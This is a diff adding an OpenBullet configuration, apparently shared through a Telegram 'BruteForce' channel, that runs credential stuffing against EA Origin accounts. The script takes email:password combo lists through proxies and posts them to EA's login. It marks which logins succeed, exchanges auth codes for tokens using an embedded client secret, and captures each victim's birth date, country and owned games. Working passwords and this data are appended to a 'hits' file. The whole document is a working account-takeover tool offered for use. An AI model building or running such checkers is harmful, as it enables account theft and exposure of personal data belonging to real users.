@@ -1,0 +1,150 @@
+[SETTINGS]
+{
+  "Name": "Origin.Com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-13T02:41:35.9162281+04:30",
+  "AdditionalInfo": "T.me/BruteForce | Capture: Games List / Number Of Games/ DOB / Country | Save Hits with Capture Text File on Open Bullet Root Folder (Origin Hits.txt) open with notepad++ |",
+  "Author": "H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_LOGS REQUEST GET "https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#POST_RHS REQUEST POST "<HEADERS(SelfLocation)>" 
+  CONTENT "email=<USER>&password=<PASS>&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "latestSuccessLogin" 
+  KEYCHAIN Failure OR 
+    KEY "Your credentials are incorrect or have expired" 
+
+#FID PARSE "<SOURCE>" LR "fid=" "\";" -> VAR "XXX" 
+
+#GET_CODE REQUEST GET "https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=<XXX>" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.8.0 Chrome/53.0.2785.148 Safari/537.36 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Host: accounts.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834" 
+
+#KON PARSE "<HEADERS(Location)>" LR "code=" "&id_" -> VAR "KON" 
+
+#PGetToken REQUEST POST "https://accounts.ea.com/connect/token" 
+  CONTENT "grant_type=authorization_code&code=<KON>&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+
+#Token PARSE "<SOURCE>" LR "access_token\" : \"" "\"," -> VAR "Token" 
+
+#Country REQUEST GET "https://gateway.ea.com/proxy/identity/pids/me" 
+  
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "X-Include-Underage: true" 
+  HEADER "X-Extended-Pids: true" 
+
+#Dob PARSE "<SOURCE>" LR "dob\" : \"" "\"," -> CAP "DOB" 
+
+#PID PARSE "<SOURCE>" LR "pidId\" : " "," -> VAR "PID" 
+
+#Country PARSE "<SOURCE>" LR "country\" : \"" "\"," -> CAP "Country" 
+
+#Get_Games REQUEST GET "https://api1.origin.com/ecommerce2/basegames/<PID>?machine_hash=17524622993368447356" 
+  
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.origin.v2+json" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "AuthToken: <Token>" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Host: api1.origin.com" 
+
+#KIR1 PARSE "<SOURCE>" LR "offerPath\" : \"/" "\"," Recursive=TRUE -> VAR "KIR1" 
+
+#KIR PARSE "<KIR1>" LR "/" "," Recursive=TRUE -> VAR "KIR" 
+
+#KIR2 FUNCTION Replace "-" " " "<KIR>" -> VAR "KIR2" 
+
+#KIR3 FUNCTION Replace "/" " = " "<KIR2>" -> VAR "KIR3" 
+
+#Games_List FUNCTION Replace "," " / " "<KIR3>" -> CAP "Games List" 
+
+#R1 FUNCTION Replace "[" "" "<Games List>" -> VAR "R1" 
+
+#R2 FUNCTION Replace "]" "" "<R1>" -> VAR "R2" 
+
+#R3 FUNCTION Replace " / " "\\n" "<R2>" -> VAR "R3" 
+
+#R4 FUNCTION CountOccurrences "\\n" "<R3>" -> VAR "R4" 
+
+#Number_Of_Games FUNCTION Compute "<R4>+1" -> CAP "Number Of Games" 
+
+#Save UTILITY File "Origin Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail\\Username: <USER> \\nPassword: <PASS>\\n<<<<<<<<<<=INFO=>>>>>>>>>>\\nDOB: <DOB>\\nCountry: <Country>\\nNumber Of Games: <Number Of Games>\\n(((Games List)))\\n <R3>\\n\\nTelegram Channel: T.me/BruteForce\\n==================================================================================" -> VAR "Save" 
+
